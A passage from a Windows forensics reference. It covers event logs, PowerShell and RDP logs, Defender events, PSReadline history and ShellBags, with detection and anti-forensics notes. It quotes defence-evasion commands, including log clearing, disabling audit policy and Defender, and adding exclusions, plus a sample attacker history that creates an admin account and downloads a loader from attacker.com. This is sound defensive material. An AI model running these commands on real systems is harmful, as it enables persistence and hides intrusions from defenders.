- **Anonymous logons (S-1-5-7)** spam the log; whitelist with care.
- **4624 from `ANONYMOUS LOGON`** — null sessions; mostly benign but historic abuse.
- **`LogonGuid` correlates** to subsequent 4769 (TGS request) on DC — useful for tracking Kerberos-ticket-based lateral movement.
- **`SubjectUserSid` vs `TargetUserSid`** — Subject is the requester (often SYSTEM for service logons), Target is the account logged on.
- **`LogonId`** is a 64-bit value that ties 4624 → 4634 / 4647 / 4688 within a session. Always preserve.
- **`ProcessName` in 4688** is from the kernel and reliable; `CommandLine` is from user-mode and spoofable via PEB rewrite.
- **NewProcessId** is hex in 4688 — easy to misread as decimal.
- **4625 SubStatus** codes are 32-bit NT status codes; mapping required for human reading.
- **`LogonProcessName`** of `NtLmSsp` and `AuthenticationPackageName` of `NTLM` together flag NTLM authentications — interesting on a Kerberos-default environment.
- **Audit policy must be configured.** Many of the canonical events do NOT fire by default. `auditpol /get /category:*` is the baseline check.
- **Subcategory vs category** — `auditpol` settings are subcategory-level; group policy may set category-level which has different semantics.

**Anti-forensics interactions:**

- **`wevtutil cl Security`** — clears the log; produces 1102 (in the new log) and Microsoft-Windows-EventLog 104. Both fire and cannot be suppressed.
- **Stopping the Event Log service** (`sc stop EventLog`) — System log 7036, no Security events flow. Restart logs 7036 + a flurry of catch-up entries.
- **Selectively deleting individual events** is impractical without invasive tooling — the EVTX format is checksummed per chunk; modification breaks checksums.
- **Auditpol manipulation** — `auditpol /set /category:"Logon/Logoff" /success:disable` silences subsequent events. Produces 4719 (audit policy changed) which itself is a high-signal event.
- **Filter-based suppression** at the registry level (`HKLM\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Security\` — `Enabled=0`) disables the channel; produces System event.
- **Log forwarding tampering** — disabling WEF / Splunk forwarders leaves an enterprise blind; not visible in Security log.

**Cross-corroboration partners:**

- **System log** for service / driver / event-log-service events.
- **Sysmon** for process and network detail.
- **PowerShell logs** for script content.
- **Domain Controller Security logs** (4768 / 4769) for the Kerberos side of every 4624.
- **NetFlow / firewall** for the network leg of 4624 Type 3 / 10.

---

## 18. System Event Log

**Full name:** Windows System Event Log. Source channel: `System`. The "what the OS itself did" log: services starting and stopping, drivers loading, time changes, disk errors, kernel-level events.

**Path / location:**
- `%SystemRoot%\System32\winevt\Logs\System.evtx`.
- Provider sources include `Service Control Manager`, `Microsoft-Windows-Kernel-General`, `Microsoft-Windows-Time-Service`, `Microsoft-Windows-EventLog`, `Microsoft-Windows-USB-USBHUB3`, `disk`, `volsnap`, `Microsoft-Windows-WindowsUpdateClient`, hundreds of others.

**Canonical events:**

Service Control Manager (source `Service Control Manager`):
- **7000** — Service failed to start.
- **7009** — A timeout was reached during service start.
- **7011** — Timeout (30000ms) waiting for a transaction response.
- **7022** — Service hung at start.
- **7034** — Service terminated unexpectedly.
- **7035** — Service was sent a Start or Stop control.
- **7036** — Service entered the running / stopped state. **Most-pivoted SCM event** — every service start/stop logs here.
- **7040** — Start type changed (e.g., Disabled → Auto).
- **7045** — A service was installed in the system. Includes `ServiceName`, `ImagePath`, `ServiceType`, `StartType`, `AccountName`. The canonical service-persistence indicator.

EventLog service (source `Microsoft-Windows-EventLog`):
- **104** — Log was cleared (per-channel; Security 1102 is the parallel in Security log).
- **1100** — Event logging service shutting down.
- **1101** — Audit events dropped by transport.
- **6005** — Event log service was started (~boot).
- **6006** — Event log service was stopped (~clean shutdown).
- **6008** — Previous shutdown was unexpected — pairs with crash forensics.
- **6013** — System uptime (in seconds, once per boot).

Kernel General:
- **12** — Operating system started.
- **13** — Operating system is shutting down.
- **1** — System time was changed (newer schemas — Kernel-General provides time-change events; older schemas log 4616 in Security).

Disk / volsnap:
- **7** / **51** / **52** — disk errors (relevant to physical-failure forensics, not malicious activity).
- volsnap events related to VSS shadow operations.

USB hub events (source `Microsoft-Windows-USB-USBHUB3`, `UMDF`, `User Device Registration`):
- USB enumeration events — vendor/product IDs of attached devices (less complete than USBSTOR, but a corroborator).

Update Client:
- **19 / 20 / 43** — update installed / failed / available.

Time Service:
- **35 / 37 / 38** — time sync events.

**Format / encoding:**

EVTX. Default size on modern Windows: 20 MB. Behavior: overwrite as needed.

**Retention:**

Days to weeks on typical workstations; hours on busy servers.

**Parsers (by name only):**
- Same set as Security log (`EvtxECmd`, `Chainsaw`, `Hayabusa`, `wevtutil`, `Get-WinEvent`).

**Canonical forensic insight:**

The System log is the canonical source for **boot/shutdown timeline** (6005/6006/6008/12/13/6013), **service lifecycle** (7036 / 7045), **driver activity** (kernel events), and **time changes** (which can disrupt other timelines). The 7045 event is the high-signal service-installation indicator; the 104 event records log clears for non-Security channels (Defender, PowerShell, Sysmon all visible).

**Gotchas:**

- **7036 is extremely chatty.** Filter on specific service names of interest.
- **6008 (unexpected shutdown)** does not imply malicious — power loss, blue screens, forced reboots all qualify.
- **Time changes** (System 1 / Security 4616) can desynchronize timelines. Investigate any unexpected time change.
- **System log size is small by default** — easy to roll out hours-old events. Configure larger size or forward.
- **EventLog service stop/start** (7036 for the EventLog service itself) means the service was restarted — possibly to defeat live tail readers.
- **PnP events for USB are split across multiple providers**; system log USB enumeration is incomplete vs. the registry trail.
- **Cluster events on servers** can be dense and require domain knowledge.

**Anti-forensics interactions:**

- **`wevtutil cl System`** — clears log; produces 104 in the cleared log (immediately new chunk). Pair with Security 1102 patterns.
- **Stopping EventLog service** — produces 7036 (in System log, before stop), then silence until restart. Restart produces flurry of catch-up entries.
- **Channel disable via registry** — `HKLM\SYSTEM\CurrentControlSet\Services\EventLog\System\Enabled=0`.
- **Manipulating service installation** — installing a service via API without 7045 firing is hard; ScmManager always emits.

**Cross-corroboration partners:**

- **Registry Services keys** (§13) — confirms surviving installation.
- **Security 4697** — service installation from the security-audit side.
- **Sysmon 6** — driver load events for `Type=1/2` services.
- **Boot timeline** — combined 6005 + 6006 + 6008 + 12 + 13 lets you reconstruct system on/off windows.

---

## 19. PowerShell Logs (4103, 4104, 600, 800)

**Full name:** Windows PowerShell event logging. Split across multiple channels and providers depending on PowerShell version.

**Path / location:**
- **Windows PowerShell** (PowerShell 5.x, classic): channel `Windows PowerShell`. File `%SystemRoot%\System32\winevt\Logs\Windows PowerShell.evtx`.
- **PowerShell** (PowerShell 5.1+ via the Microsoft-Windows-PowerShell provider; PowerShell 7+ via PowerShellCore): channel `Microsoft-Windows-PowerShell/Operational`. File `Microsoft-Windows-PowerShell%4Operational.evtx`.
- ConsoleHost_history.txt is covered separately (§22).

**Events recorded:**

In `Microsoft-Windows-PowerShell/Operational`:
- **4103** — Module Logging. Records pipeline executions when `Module Logging` is enabled with `*` wildcard. Each event has the script command, command parameters, parameter values, host application. Voluminous when on.
- **4104** — Script Block Logging. Records the de-obfuscated text of every PowerShell script block executed, including invoked at `$ExecutionContext.InvokeCommand.NewScriptBlock` time. **The single highest-value PowerShell artifact** — captures the script after every layer of obfuscation has been resolved into runnable code. Critical IDs: `4104` warning-level events fire for "suspicious" script blocks even when full SBL is off (since PowerShell 5.0).
- **4105 / 4106** — Script block invocation start / stop (rarely needed).
- **53504** — Authenticating PowerShell user.

In `Windows PowerShell`:
- **400** — Engine state changed to Available (PowerShell session started).
- **403** — Engine state changed to Stopped.
- **600** — Provider lifecycle events. Records `HostApplication`, command, who invoked.
- **800** — Pipeline execution details (when Module Logging enabled in classic).

**Transcription** (separate, not events):
- When PowerShell Transcription is enabled (`HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription\EnableTranscripting=1`), every PowerShell session writes a text transcript to the configured directory (defaults under `Documents`). Captures user input, output, timestamps.

**Format / encoding:**

EVTX. Script block content in 4104 is plain text (the post-deobfuscation source). If the script block is large, PowerShell splits it across multiple events with `MessageNumber` and `MessageTotal` fields — reassembly required.

**Retention:**

Operational log default 15 MB; rolls quickly on PowerShell-heavy hosts. Forwarding essential.

**Parsers (by name only):**
- `EvtxECmd`, `Chainsaw`, `Hayabusa`.
- `Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104}` for live.
- `PowerShellArsenal`, `PowerShellMafia` not parsers — frameworks attackers use that defenders study.

**Canonical forensic insight:**

PowerShell 4104 is the **post-obfuscation script source** capture. An attacker can `[Convert]::FromBase64String`, `Invoke-Expression`, AMSI-bypass, layer encryption — but eventually the engine compiles a script block, and at that moment 4104 emits the cleartext. This is the single highest-value defender artifact on PowerShell-heavy attacks: it is why mature attackers prefer C# / .NET reflection / process injection over native PowerShell.

PowerShell 400 + 403 frame each session ("when was a PowerShell host started, by whom, with what version, what runspace ID"). 600 covers provider operations. 800 captures pipeline execution including commands and parameter values when classic logging enabled.

**Gotchas:**

- **Module Logging and SBL must be enabled** via policy or registry: `HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging=1`. Off by default on consumer SKUs.
- **Even with SBL off**, suspicious script blocks fire 4104 at warning level (built-in heuristic — `Invoke-Expression`, common obfuscation patterns).
- **AMSI bypass** does NOT bypass 4104 — script block logging happens at compile time, before AMSI's scan. Attacker would need to disable SBL via policy / registry, which requires admin and leaves its own trace.
- **Large script blocks split across multiple events.** Stitching by `ScriptBlockId` and ordering by `MessageNumber` is required.
- **PowerShell version matters.** PowerShell 7+ logs to `PowerShellCore/Operational` instead.
- **The host application context** (`HostApplication`) tells you whether the script ran in `powershell.exe`, `powershell_ise.exe`, embedded host (Office, MSBuild), or a custom runspace.
- **Constrained Language Mode** restricts what PowerShell can do; observed mode is captured in some 4103 / transcription contexts.
- **Module Logging logs parameter VALUES**, which can contain credentials. Treat the log as sensitive.
- **Encoded commands** (`powershell -enc <base64>`) are visible in the parent process command-line (Sysmon 1 / 4688) — decoded by the same engine and visible in 4104 once compiled.

**Anti-forensics interactions:**

- **`Disable-PSRemoting`** does not disable logging.
- **Registry policy override** — setting `EnableScriptBlockLogging=0` requires admin and leaves a registry write trace.
- **`Set-PSReadlineOption -HistorySaveStyle SaveNothing`** disables ConsoleHost_history.txt but not 4104.
- **Memory-resident execution via `IEX`** of downloaded content — still produces 4104 events for each compiled script block.
- **Custom runspace embedding** — running PowerShell inside a host that doesn't load `System.Management.Automation` properly may bypass standard logging. Rare.
- **Clearing the channel** — `wevtutil cl Microsoft-Windows-PowerShell/Operational` produces 104 in System log.
- **AMSI patching** — disables AMSI, NOT SBL.
- **`-EncodedCommand`** is logged decoded by SBL.

**Cross-corroboration partners:**

- **Sysmon 1 / Security 4688** — process creation showing `powershell.exe` with arguments.
- **Sysmon 22** — DNS queries from PowerShell.
- **Sysmon 3** — outbound network from PowerShell.
- **PowerShell transcript file** — full session output (if enabled).
- **Defender 1116/1117** — if AMSI tagged something.
- **ConsoleHost_history.txt** — interactive command history.

---

## 20. RDP-related Logs (1149, 21/23/24/25)

**Full name:** Remote Desktop Protocol session logs. Distributed across multiple event log channels, with critical fields in `Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational` and `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational`.

**Path / location:**
- `%SystemRoot%\System32\winevt\Logs\Microsoft-Windows-TerminalServices-RemoteConnectionManager%4Operational.evtx`
- `%SystemRoot%\System32\winevt\Logs\Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx`
- `%SystemRoot%\System32\winevt\Logs\Microsoft-Windows-TerminalServices-RDPClient%4Operational.evtx` (outbound — when this host RDP'd elsewhere)
- Security log: 4624 (LogonType 10 — RemoteInteractive; LogonType 7 — Unlock after reconnect), 4625, 4634, 4647, 4778 (session reconnected), 4779 (session disconnected).

**Events recorded:**

RemoteConnectionManager/Operational (inbound RDP — this host is the RDP server):
- **1149** — Remote Desktop Services: User authentication succeeded. Includes `User`, `Domain`, `Source Network Address` (the source IP). **The first event in an inbound RDP session.** Fires BEFORE 4624 — authentication occurred but session may not have been allowed yet.

LocalSessionManager/Operational (inbound RDP — session lifecycle):
- **21** — Session logon succeeded. Includes `User`, `Session ID`, `Source Network Address`.
- **22** — Shell start notification.
- **23** — Session logoff succeeded.
- **24** — Session has been disconnected. (Different from logoff — disconnection means the session is suspended, still running, ready to be reconnected.)
- **25** — Session reconnection succeeded.
- **39** — Session disconnected (alternative reason).
- **40** — Session disconnected (reason code).

RDPClient/Operational (outbound RDP — this host initiated an RDP):
- **1024** — Connection started. Includes destination computer name.
- **1102** — Connection succeeded. (Not to be confused with Security 1102 audit log clear.)
- **1029** — Hashed username with seed.

Security log:
- **4624 LogonType=10** — RemoteInteractive logon (RDP).
- **4624 LogonType=7** — Unlock (after session reconnect).
- **4778** — Session reconnected (workstation name + source IP).
- **4779** — Session disconnected.

**Format / encoding:** EVTX, standard.

**Retention:**

These operational channels default to small sizes (1 MB on older Windows, 8 MB recent). RDP-heavy hosts roll these in days; bastion / RDP gateway hosts in hours.

**Parsers (by name only):**
- `EvtxECmd`, `Chainsaw`, `Hayabusa`.
- `Get-WinEvent` with channel filter.
- Mandiant's `rdp-event-log` aggregator.

**Canonical forensic insight:**

RDP logs are the **canonical lateral-movement-via-RDP artifact**. The triage chain for a suspected RDP-based intrusion is:

1. **1149** (RemoteConnectionManager) — initial inbound RDP with source IP.
2. **21 / 25** (LocalSessionManager) — session establishment / reconnection.
3. **4624 Type 10** (Security) — logon record matched by `LogonId` to subsequent activity.
4. **Subsequent 4624 Type 3** events with the same source — pivots through SMB.
5. **23 / 24 / 4779** — session end.

For outbound from a victim host pivoting outward, RDPClient/Operational 1024 with destination name. The `bitmapcache` files on the client side hold thumbnails of remote desktops (separate artifact — `%LocalAppData%\Microsoft\Terminal Server Client\Cache\`).

**Gotchas:**

- **1149 fires before authentication is confirmed** — a 1149 without a matching 21 may indicate a Network Level Authentication failure that succeeded NLA but failed RD policy.
- **LogonType 10 vs LogonType 7** — Type 10 is initial RDP; Type 7 is unlock after reconnect (which can be either local console unlock or RDP reconnect).
- **Source Network Address can be `LOCAL`** — for shadow / console-pivot RDP.
- **IPv6 addresses** show up bracketed.
- **Session IDs reuse**; combine with LogonId for correlation.
- **NLA-failed connections** may not produce 1149 at all — only 4625 in Security.
- **Restricted Admin Mode** and **CredSSP** versions affect what authentication signals appear.
- **The `bitmapcache`** is on the CLIENT (the host that connected outward). Bitmap-cache reconstruction can yield screenshots of the remote desktop the client saw.
- **RDPClient/Operational** records outbound; victim hosts that pivot via RDP have this populated.

**Anti-forensics interactions:**

- **Clearing TerminalServices channels** — `wevtutil cl Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` produces 104 in System.
- **Disabling NLA** changes the event sequence (1149 may not fire pre-auth).
- **Bastion/jump-box obfuscation** — RDP through a jump host hides the true source from the destination's logs; only the jump host's IP appears.
- **Restricted Admin Mode** — doesn't leave NTLM cached credentials on the destination, complicating credential-theft response.
- **mstsc.exe history** — `HKCU\Software\Microsoft\Terminal Server Client\Default\MRU*` and `Servers\<hostname>` hold connection history; attackers can clear these.
- **Bitmap cache deletion** by user is straightforward; deletion leaves $MFT / $UsnJrnl trace.

**Cross-corroboration partners:**

- **Security 4624 / 4625 / 4634 / 4647 / 4778 / 4779.**
- **Sysmon 3** — TCP connection to/from port 3389.
- **Firewall log** — connection records.
- **mstsc.exe `Servers` registry key** — attacker's connection history on the source host.
- **bitmapcache** — visual record of remote sessions.

---

## 21. Defender Logs (1116/1117/5001/5007)

**Full name:** Windows Defender Antivirus event logging. Source channel: `Microsoft-Windows-Windows Defender/Operational`. Defender (now formally "Microsoft Defender Antivirus") emits structured events for every detection, scan, definition update, action, and configuration change.

**Path / location:**
- `%SystemRoot%\System32\winevt\Logs\Microsoft-Windows-Windows Defender%4Operational.evtx`
- Secondary: `Microsoft-Windows-Windows Defender%4WHC.evtx` (Windows Health Check).
- Quarantine: `C:\ProgramData\Microsoft\Windows Defender\Quarantine\` (Resource subdir holds the original files in obfuscated form; ResourceData holds the malicious blobs; Entries holds metadata).
- Configuration: registry under `HKLM\SOFTWARE\Microsoft\Windows Defender\` and `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\`.
- MpLog logs: `C:\ProgramData\Microsoft\Windows Defender\Support\MPLog-*.log` — extensive verbose scan logs (per-file scan times, paths, threats, scan engine results). Rotating, several MB each, often a year+ of history retained.
- ProtectionHistory: `C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\DetectionHistory\` — per-detection records in binary form, with timestamps, paths, hashes, threat names. Drives the Defender app's Protection History UI.

**Events recorded:**
- **1116** — Antivirus detected malware. Severity, threat name, threat ID, action, user, process name, threat path. **The single highest-value Defender event.**
- **1117** — Antivirus took action. Pair with 1116.
- **1118** — Action failed.
- **1119** — Critical action failed.
- **1006** — Antimalware engine detected malware (older / generic).
- **1007** — Action taken on malware (older / generic).
- **1015** — Suspicious behavior detected.
- **2000** — Antivirus signature version updated.
- **2001 / 2002** — Update failed / definition not found.
- **3002** — Real-time protection failure.
- **5001 / 5004 / 5007 / 5010** — Configuration: real-time protection disabled / exclusion added / configuration changed / scanning disabled.
- **5012** — Scanning for malware/spyware disabled.
- **5013** — Behavior monitoring disabled.

ASR rule events (`Microsoft-Windows-Windows Defender/Operational`):
- **1121 / 1122** — ASR rule blocked / audited an event.

**Format / encoding:** EVTX. MpLog is text. Quarantine is custom binary (key derived from machine SID).

**Retention:**

Defender Operational log: 1 MB default — rolls in hours on actively-defended hosts. MpLog rotates with substantial retention (often months). DetectionHistory preserves all detection records permanently until manual purge.

**Parsers (by name only):**
- `EvtxECmd`, `Chainsaw`.
- `Get-MpComputerStatus`, `Get-MpThreat`, `Get-MpThreatDetection` — PowerShell modules for live state.
- `defender-quarantine-extractor` (community Python tool) — extracts quarantined original files.
- `MPLogParser` — parses the verbose MPLog.

**Canonical forensic insight:**

Defender 1116 is the **detection-of-record event** for any malware Windows itself recognized. The threat name (from Microsoft's signature taxonomy — `Trojan:Win32/...`, `Behavior:Win32/...`, `HackTool:Win32/...`) is the threat-intel hook. Pair with 1117 (action taken) to determine whether the threat was blocked, quarantined, or merely detected.

5001 / 5007 events catch **attacker tampering with Defender configuration** — disabling real-time protection, adding exclusions to whitelist their tools. The exclusion-added trail (path or process exclusion) is among the top-five "you've been compromised" signals.

MpLog is the **per-file scan record** — every file Defender's scanner touched, with verdict. Massive volume but high fidelity. Quarantine extraction recovers the original malware sample for analysis.

**Gotchas:**

- **Defender Operational log rolls in HOURS** at default size. Forwarding mandatory.
- **5001 (real-time disabled) may be benign** during certain admin operations (Defender update flow disables briefly). Look for paired re-enable.
- **Exclusion path may be a directory** — `C:\Users\<user>\AppData\` is overly broad; a sign of attacker tampering or sloppy admin.
- **MpLog timestamps are local time** (with TZ); EVTX events are UTC. Cross-correlating requires conversion.
- **Quarantine is encrypted** with the machine's MachineGuid + SID derivative; recovery requires offline knowledge of the machine key.
- **DetectionHistory binary format** is undocumented but reverse-engineered by community tooling.
- **Threat names change** across signature versions — historical analysis may miss matches if you search only current taxonomy.
- **Process name in 1116** is the process that touched the file, not necessarily the malicious process.
- **Multiple 1116 events for one threat** are normal — every read-back can trigger.
- **Defender for Endpoint (MDE)** — when present, supersedes local Defender for many events; cloud telemetry not in local logs.

**Anti-forensics interactions:**

- **`Set-MpPreference -DisableRealtimeMonitoring $true`** — 5001 event fires.
- **Adding exclusion** (`Add-MpPreference -ExclusionPath`, `-ExclusionProcess`) — 5007 event fires with the exclusion details.
- **Stopping the WinDefend service** — System log 7036 plus Defender 3002.
- **Disabling Tamper Protection** — only possible via Intune / settings UI; not scriptable by attacker.
- **Deleting `MpLog`** — visible in $MFT / $UsnJrnl; logs rotate quickly anyway.
- **Disabling Microsoft Defender entirely via Group Policy / registry** — `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware=1` (legacy; modern Tamper Protection prevents this).
- **Clearing Operational log** — `wevtutil cl Microsoft-Windows-Windows Defender/Operational` produces 104.
- **Replacing Defender binaries** — Tamper Protection blocks on modern Windows; older versions vulnerable.

**Cross-corroboration partners:**

- **Sysmon 1 / Security 4688** — process that introduced the file Defender detected.
- **Amcache / Prefetch** — execution of the threat.
- **$MFT** — file create timestamp of the threat file (compare to 1116 detection time).
- **Quarantine entries** — original file recoverable.
- **Security 4657** — registry write to Defender exclusion keys (if auditing enabled).

---

## 22. PowerShell ConsoleHost_history.txt

**Full name:** PSReadline command history. A text file written by the PSReadline module (auto-loaded into every interactive `powershell.exe` and PowerShell 7 session) recording the user's interactive command history.

**Path / location:**
- Per-user: `%AppData%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` (Windows PowerShell 5.x).
- PowerShell 7: `%AppData%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` (same path).
- VS Code PowerShell extension may write to a different host-specific file.

**What it records:**

Plain-text, one line per command the user typed at the PowerShell prompt and hit Enter on. Multi-line commands (typed with line continuation) are joined into a single line. Includes:
- Every interactive command, including typos and abandoned commands.
- Tab-completion results once accepted.
- Commands typed but never executed if PSReadline's "AddToHistoryHandler" allowed them.

Does NOT record:
- Non-interactive PowerShell invocations (`powershell -c`, `powershell -File`).
- Commands run inside scripts that the user invoked.
- Commands the user explicitly excluded with `Set-PSReadlineOption -AddToHistoryHandler { ... return $false }`.

**Format / encoding:** Plain UTF-8 text. Line-delimited.

**Retention:**

Defaults: maximum 4096 lines (configurable via `Set-PSReadlineOption -MaximumHistoryCount`). Oldest dropped first when full. Persisted across sessions. **No timestamps recorded** — only command order.

**Parsers (by name only):**

Plain-text — no parser. Any text editor, `grep`, `Select-String`. KAPE has a target that collects it.

**Canonical forensic insight:**

ConsoleHost_history.txt is the **interactive PowerShell shoulder-surf** artifact — the analyst's window into what the attacker typed at the keyboard. For hands-on-keyboard incidents (operator interactively driving a session through Cobalt Strike, SSH-tunneled PSRemoting, RDP-to-powershell), this file holds the verbatim command sequence.

A typical compromise reads:
```
Get-LocalUser
net user attacker P@ssw0rd123 /add
net localgroup administrators attacker /add
powershell -enc <base64>
Invoke-WebRequest http://attacker.com/loader.ps1 -OutFile c:\windows\temp\l.ps1
```
— and that file persists across reboot until the user clears or the line limit rolls.

**Gotchas:**

- **No timestamps.** Command order is preserved; absolute times are not. Combine with PowerShell 4104 (which has timestamps) to anchor.
- **One file per user per host.** Roaming profiles complicate.
- **PSRemoting (remoting into the host) writes to the local file** as the connected user. If attacker uses `Enter-PSSession`, the destination machine's ConsoleHost_history may capture commands.
- **Aliases and abbreviated commands** appear verbatim — `gci`, `ls`, `Set-Acl` may all mean different things.
- **Tab-completion expansions** are NOT generally captured — only the final accepted command.
- **`Clear-History`** affects the in-session history, NOT the file directly. `Remove-Item $(Get-PSReadlineOption).HistorySavePath` is required to delete.
- **The file is updated periodically**, not on every Enter — there may be a small delay between command execution and file persistence.
- **PowerShell ISE does not use PSReadline by default** — different mechanism (ISE's own history, less rich).
- **Constrained Language Mode** does not affect history capture.
- **Empty file** does NOT prove "no interactive PowerShell" — it means no PSReadline-tracked commands. Non-interactive runs are invisible here.

**Anti-forensics interactions:**

- **`Set-PSReadlineOption -HistorySaveStyle SaveNothing`** — disables future writes.
- **`Set-PSReadlineOption -AddToHistoryHandler { $false }`** — same effect via handler.
- **Deleting the file** — leaves $MFT trace; the next session creates a new empty file.
- **Manual editing** with a text editor — straightforward; no checksum or signature to validate.
- **Using `-EncodedCommand`** from `cmd.exe` parent — the parent shell is `cmd.exe`, not `powershell.exe`'s interactive prompt, so no PSReadline involvement.
- **Running through `Start-Process powershell`** vs interactively — the spawned non-interactive `powershell.exe` instance doesn't load PSReadline interactive history.

**Cross-corroboration partners:**

- **PowerShell 4104** — script block content (timestamped).
- **PowerShell 400 / 800** — session start / pipeline.
- **Sysmon 1 / Security 4688** — `powershell.exe` process creations.
- **VSS** — older copies of the file may exist in shadows.
- **$UsnJrnl** — file modification events on ConsoleHost_history.txt.

---

## 23. ShellBags

**Full name:** Windows Shell folder view preferences. The mechanism by which Explorer remembers per-folder display settings (icon size, sort order, column widths, view mode). The forensic value is incidental but enormous: ShellBags record every folder Explorer has rendered, including folders on external drives, network shares, deleted folders, and folders the user briefly browsed and then closed.

**Path / location:**
- **NTUSER.DAT (per-user):**
  - `HKCU\Software\Microsoft\Windows\Shell\Bags`
  - `HKCU\Software\Microsoft\Windows\Shell\BagMRU`
  - `HKCU\Software\Microsoft\Windows\ShellNoRoam\Bags`
  - `HKCU\Software\Microsoft\Windows\ShellNoRoam\BagMRU`
- **UsrClass.dat (per-user, modern primary):**
  - `HKCU\Local Settings\Software\Microsoft\Windows\Shell\Bags`
  - `HKCU\Local Settings\Software\Microsoft\Windows\Shell\BagMRU`
  - `HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU` (the on-disk path).

Modern Windows (Win10+) writes the bulk of ShellBag data to UsrClass.dat, not NTUSER.DAT.

**What they record:**

For each folder Explorer has rendered (including My Computer, Desktop, Control Panel virtual locations, mapped drives, USB, network shares, ZIP archives, recycle bin):
- A node in `BagMRU` representing the folder. The hierarchy mirrors the navigation path: BagMRU\0 = Desktop; BagMRU\0\1 = My Computer; BagMRU\0\1\3 = C:\; BagMRU\0\1\3\7 = C:\Users\.
- A `MRUListEx` value listing child-order (most-recently-used first).
- A `NodeSlot` value pointing to the corresponding `Bags\<N>\Shell\` subkey holding view settings.
- A binary `<index>` value encoding the **ITEMIDLIST/PIDL** — a shell item identifier list with the folder name, modified time, creation time, accessed time, FileSize attribute flag, and type (filesystem folder, network share, ZIP, virtual).

The PIDL is the gold: it encodes the folder name and timestamps as the shell saw them at the time of browsing.

**Format / encoding:**

Binary blob (`REG_BINARY`) per `<index>` value. The blob is a shell ITEMIDLIST — a packed sequence of SHITEMID structures. Each SHITEMID has a 2-byte size, a 1-byte type discriminator, and a type-specific payload. Common payload types: filesystem (0x31/0x32), zip (0x46), network share, control panel.

The 0x31/0x32 filesystem ITEMIDs embed FAT-style DOS dates (2-second resolution) AND, post-Vista, an extension block with full FILETIME modified/created/accessed.

**Retention:**

Indefinite. Once a folder is recorded, the entry persists until the bag count overflows (~5000 in modern Windows) or the user clears Folder Options → "Reset Folders." External drives that haven't been seen in years remain in BagMRU. Deleted folders remain in BagMRU.

**Parsers (by name only):**
- Eric Zimmerman's `ShellBagsExplorer` (Windows GUI) and `SBECmd` (CLI).
- RegRipper `shellbags` plugin (Harlan Carvey) — historical.
- Joachim Metz's `libfwsi` (shell item parsing).
- `python-registry` + custom ITEMIDLIST parsing.
- TZWorks `sbag`.

**Canonical forensic insight:**

ShellBags are **THE artifact for "where did the user browse?"** — including:
- Folders on USB drives no longer plugged in.
- Folders on network shares no longer accessible.
- Folders that have since been deleted.
- Folders inside ZIP archives the user opened.
- Folders the user briefly browsed and then navigated away from.

They corroborate or refute claims like "I never opened that folder" with strong evidence. Embedded timestamps (PIDL-encoded) give first-seen-by-Explorer time, which is rarely the same as the folder's actual creation time — useful for divergence detection.

**Gotchas:**

- **Modern path is UsrClass.dat, not NTUSER.DAT.** Tools that look only at NTUSER find empty bags on Win10+.
- **PIDL timestamps are NOT filesystem timestamps.** They're shell-recorded timestamps at the moment the bag was created — which may predate or postdate the actual filesystem time.
- **DOS date precision (2-second)** in older PIDLs vs. FILETIME precision in extension blocks. Cross-check.
- **The `NodeSlot` numbering** is per-hive; comparing slot numbers across hosts is meaningless.
- **Empty BagMRU/0** is normal — root is Desktop, which is implicit.
- **MRUListEx ordering** is volatile; analytical value is the presence of the entry, not its position.
- **ZIP-archive browsing** creates SHITEMIDs of type 0x46 with embedded paths inside the archive. Excellent for catching ZIP-based exfil.
- **Network share entries** include UNC paths, providing recon evidence.
- **Roaming profiles** can sync ShellBags between machines, contaminating the picture.

**Anti-forensics interactions:**

- **`Reset Folders`** in Folder Options clears bags but leaves a registry write trace (key last-write times).
- **Deleting `BagMRU` / `Bags` keys** offline — leaves deleted-cell residue parseable by RegRipper / regipy.
- **Using `cmd.exe` instead of Explorer** — no ShellBags entries created. Same for `dir`, `Get-ChildItem` — pure command-line file access doesn't touch the shell.
- **Browsing via UNC paths typed in Run dialog** still creates ShellBags on the destination network entries.
- **Private browsing has no analog for Explorer** — every Explorer-rendered folder records.

**Cross-corroboration partners:**

- **RecentDocs** (`HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs`) — files (not folders) opened recently.
- **LNK files / Jump Lists** (§24) — frequently-used items.
- **TypedPaths** (`HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths`) — paths typed into Explorer address bar.
- **MountedDevices / USBSTOR** (§28) — which USB drive corresponds to which volume GUID in a ShellBag.
- **$MFT** on the bag-recorded folder paths — corroborate folder existence.

---

## 24. LNK Files + Jump Lists

**Full name:** Windows shortcut files (.lnk) and Application User Model ID (AUMID) jump lists. Both are forensic records of file access — LNK files for individual files and jump lists for per-application MRU/pinned lists.

**Path / location:**
- **Automatic LNKs** (recent items): `%AppData%\Microsoft\Windows\Recent\*.lnk` — created automatically by the shell whenever a user opens a file via Explorer or a common-dialog.
- **Office Recent**: `%AppData%\Microsoft\Office\Recent\*.lnk`.
- **Pinned**: `%AppData%\Microsoft\Internet Explorer\Quick Launch\User Pinned\*\*.lnk`.
- **Start Menu LNKs**: `%AppData%\Microsoft\Windows\Start Menu\Programs\*.lnk` and all-users `%ProgramData%\...`.
- **Startup LNKs**: `%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\*.lnk` — autostart vector.
- **Automatic Jump Lists**: `%AppData%\Microsoft\Windows\Recent\AutomaticDestinations\<AppID>.automaticDestinations-ms`.
- **Custom Jump Lists**: `%AppData%\Microsoft\Windows\Recent\CustomDestinations\<AppID>.customDestinations-ms`.

**What they record:**

LNK files (Microsoft Compound Document or Shell Link Binary File Format):
- Target path (`LinkTargetIDList` — ITEMIDLIST) and a localBasePath string.
- Target's volume serial number, drive type (fixed, removable, network), volume label.
